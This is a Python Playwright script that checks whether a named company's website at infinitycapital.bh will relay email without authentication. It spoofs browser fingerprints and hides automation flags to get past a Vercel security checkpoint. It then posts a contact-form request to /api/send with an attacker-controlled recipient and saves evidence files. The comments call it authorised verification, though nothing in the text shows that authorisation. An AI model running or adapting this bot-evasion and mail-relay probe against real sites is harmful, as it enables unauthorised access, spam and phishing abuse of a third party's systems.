#!/usr/bin/env python3
"""
Independent verification: unauthenticated email relay via POST /api/send
on https://www.infinitycapital.bh/
Drives a REAL headless Chromium so the Vercel Security Checkpoint JS challenge
is solved exactly as a real visitor's browser would.
"""
import sys, json, time, asyncio
from playwright.async_api import async_playwright

BASE = "https://www.infinitycapital.bh"
OUT = "/work/evidence"

async def main():
    tag = sys.argv[1] if len(sys.argv) > 1 else "run1"
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-blink-features=AutomationControlled",
                  "--disable-dev-shm-usage"])
        ctx = await browser.new_context(
            user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
            locale="en-US", timezone_id="Asia/Bahrain", viewport={"width":1440,"height":900})
        # stealth-ish
        await ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
        page = await ctx.new_page()
        reqs = []
        page.on("request", lambda r: reqs.append(("REQ", r.method, r.url)))
        page.on("response", lambda r: reqs.append(("RES", r.status, r.url)))

        log = []
        def rec(*a):
            s = " ".join(str(x) for x in a)
            log.append(s); print(s, flush=True)

        # ---- 1. load site, pass the checkpoint ----
        rec("== STEP 1: load", BASE + "/contact ==")
        resp = await page.goto(BASE + "/contact", wait_until="domcontentloaded", timeout=60000)
        rec("initial status:", resp.status if resp else None)
        title = await page.title()
        rec("title:", title)

        if "Security Checkpoint" in (title or ""):
            rec("challenge detected -> waiting up to 45s for reload...")
            for i in range(45):
                await page.wait_for_timeout(1000)
                t = await page.title()
                if "Security Checkpoint" not in t:
                    rec("challenge passed after", i+1, "s; title now:", t)
                    break
            else:
                rec("!! challenge NOT passed within 45s")
        await page.screenshot(path=f"{OUT}/site_{tag}.png", full_page=False)
        rec("body snippet:", (await page.content())[:300].replace("\n"," "))

        # ---- 2. is the endpoint reachable / what does it say? ----
        rec("\n== STEP 2: unauthenticated POST /api/send with ATTACKER-CONTROLLED recipient ==")
        # NOTE: this page context carries no login/session of any kind -> pure anonymous.
        probe_recipient = f"probe-openrelay-{tag}@mailinator.com"
        body = {
            "fname": "Security",
            "lname": "Verification",
            "cname": "Infinity Capital Compliance",
            "email": f"reporter-{tag}@mailinator.com",
            "tel": "+973 3000 0000",
            "subject": f"Relay probe {tag}",
            "msg": f"Authorized unauthenticated relay verification {tag}. Sent by independent verifier.",
            "targets": probe_recipient,     # <-- attacker controlled To: address
            "check": "0",                   # honeypot field explicitly set to 0
        }
        api = await ctx.request.post(BASE + "/api/send", form=body, timeout=60000)
        st = api.status()
        txt = await api.text()
        rec("POST /api/send ->", st)
        rec("content-type:", api.headers.get("content-type"))
        rec("body:", txt[:1500])
        await page.screenshot(path=f"{OUT}/api_{tag}.png")

        result = {
            "tag": tag,
            "page_title_after_challenge": await page.title(),
            "site_status_initial": resp.status if resp else None,
            "post_status": st,
            "post_content_type": api.headers.get("content-type"),
            "post_body": txt[:2000],
            "probe_recipient": probe_recipient,
            "request_body": body,
            "network": [list(x) for x in reqs][:80],
        }
        with open(f"{OUT}/result_{tag}.json","w") as f:
            json.dump(result, f, indent=2)
        with open(f"{OUT}/log_{tag}.txt","w") as f:
            f.write("\n".join(log))
        await browser.close()

asyncio.run(main())
